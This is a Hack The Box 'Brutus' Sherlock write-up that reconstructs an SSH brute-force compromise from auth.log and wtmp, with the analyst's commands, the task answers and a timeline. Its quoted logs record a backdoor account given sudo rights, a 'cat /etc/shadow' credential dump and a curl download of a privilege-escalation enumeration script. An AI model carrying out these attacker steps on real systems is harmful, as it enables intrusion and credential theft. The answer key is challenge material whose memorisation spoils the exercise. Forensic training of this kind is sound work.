# HTB Sherlock: Brutus

**Category:** DFIR / Log Analysis
**Artifacts provided:** `auth.log`, `wtmp`
**Tools used:** `grep`, `awk`, custom `utmp.py` parser (see below)

## Scenario

A Linux server (`ip-172-31-35-28`) was compromised via SSH brute force. The attacker
gained root access, created a backdoor account for persistence, escalated that
account's privileges, and used it to carry out post-exploitation recon and tooling
download. This writeup reconstructs the full attack timeline from `auth.log` and
`wtmp`.

## Tooling note

`wtmp` is a binary file, not human-readable, so it needs a parser to pull login
session records (type, user, host, session ID, timestamp) out of the raw
`struct utmp` layout. I used a small Python script (`utmp.py`) to convert it to
TSV for `awk`/`grep` analysis:

```bash
python3 utmp.py wtmp -o wtmp.tsv
```

`auth.log` timestamps have no year and are logged in the server's local
configured timezone, which for this box lines up with UTC — confirmed by
cross-referencing session open/close times against the corresponding `wtmp`
records, and the year (2024) was pulled from the `wtmp` boot/session records
since `auth.log` alone doesn't carry it.

## Task 1 — Attacker IP

```bash
grep "Failed password" auth.log | grep -oP '(?<=from )[\d.]+' | sort | uniq -c | sort -rn | head
```

**Answer: `65.2.161.68`**

Starting at `06:31:31`, this IP sprayed a dictionary of usernames
(`admin`, `backup`, `server_adm`, `svc_account`, `root`) against SSH in rapid
succession — dozens of connections within a handful of seconds, several of them
throttled by `sshd`'s `MaxStartups`:

```
Mar  6 06:31:31 ip-172-31-35-28 sshd[620]: error: beginning MaxStartups throttling
Mar  6 06:31:31 ip-172-31-35-28 sshd[620]: drop connection #10 from [65.2.161.68]:46482 ... past MaxStartups
```

## Task 2 — Compromised account

```bash
grep "Accepted password" auth.log
```

**Answer: `root`**

```
Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2
```

The brute force against `root` succeeded roughly 9 seconds after the spray began.

## Task 3 — Manual login timestamp (from wtmp)

`auth.log` shows *when authentication succeeded*, not when the attacker actually
sat down at a terminal. `wtmp` distinguishes the two — the first root login
(session 34, below) was an instant connect/disconnect, consistent with the
brute-force tool validating the cracked credential rather than a human logging
in. The next root login is the real one:

```bash
awk -F'\t' '$5=="\"root\"" && $6=="\"65.2.161.68\""' wtmp.tsv
```

```
"USER"  "2549"  "pts/1" "ts/1"  "root"  "65.2.161.68"   ...  "2024/03/06 13:32:45"  ... "65.2.161.68"
```

**Answer: `2024-03-06 06:32:45 UTC`**

(The `wtmp` parser renders timestamps via local time conversion on the analysis
box, which showed 7 hours ahead of the equivalent `auth.log` entry —
`06:32:44` — confirming the offset and giving the UTC value above.)

## Task 4 — SSH session number

```bash
grep "New session" auth.log
```

```
Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
```

**Answer: `37`**

(Not session 34 — that was the sub-second validation connection from the brute
force tool, immediately opened and closed.)

## Task 5 — Persistence account

```bash
grep -E "useradd|groupadd" auth.log
```

```
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: new group: name=cyberjunkie, GID=1002
Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1
Mar  6 06:34:26 ip-172-31-35-28 passwd[2603]: pam_unix(passwd:chauthtok): password changed for cyberjunkie
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to group 'sudo'
```

**Answer: `cyberjunkie`**

Created during the session-37 interactive login, given a password, and added
to the `sudo` group for elevated privileges.

## Task 6 — MITRE ATT&CK sub-technique

**Answer: `T1136.001`** — Persistence: Create Account: Local Account

## Task 7 — First SSH session end time

```bash
grep "session 37" auth.log; grep "port 53184" auth.log
```

```
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Received disconnect from 65.2.161.68 port 53184:11: disconnected by user
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session closed for user root
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Session 37 logged out.
```

**Answer: `2024-03-06 06:37:24 UTC`**

## Task 8 — sudo command to download script

```bash
grep "sudo:" auth.log | grep "COMMAND="
```

```
Mar  6 06:37:57 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

**Answer:**
```
/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

`linper.sh` is a Linux privilege-escalation enumeration script — consistent
with the attacker using their new sudo-capable backdoor account to continue
recon on the box.

## Timeline summary

| Time (UTC)         | Event |
|---------------------|-------|
| 06:31:31             | Brute force begins from `65.2.161.68` — usernames `admin`, `backup`, `server_adm`, `svc_account`, `root` sprayed rapidly |
| 06:31:40             | Root password cracked; instant validation login (session 34) opens and closes same second |
| 06:32:44             | Attacker's real interactive login as `root` — session 37 |
| 06:34:18             | New user `cyberjunkie` created (persistence) |
| 06:34:26             | Password set for `cyberjunkie` |
| 06:35:15             | `cyberjunkie` added to `sudo` group (privilege escalation) |
| 06:37:24             | Session 37 (root) ends |
| 06:37:34             | Attacker logs back in as `cyberjunkie` via the backdoor account |
| 06:37:57             | `sudo cat /etc/shadow` — credential dump |
| 06:39:38             | `sudo curl .../linper.sh` — privesc enumeration tooling pulled down |

## Key takeaway

The two-stage login pattern (instant validation hit, then a real session
minutes later) is a useful brute-force fingerprint worth watching for in
general — it separates automated credential-testing traffic from the human
operator actually taking control. Cross-referencing `auth.log` (authentication
events) against `wtmp` (session records) was what surfaced that distinction
here, since `auth.log` alone would have made session 34 and session 37 look
like the same event.
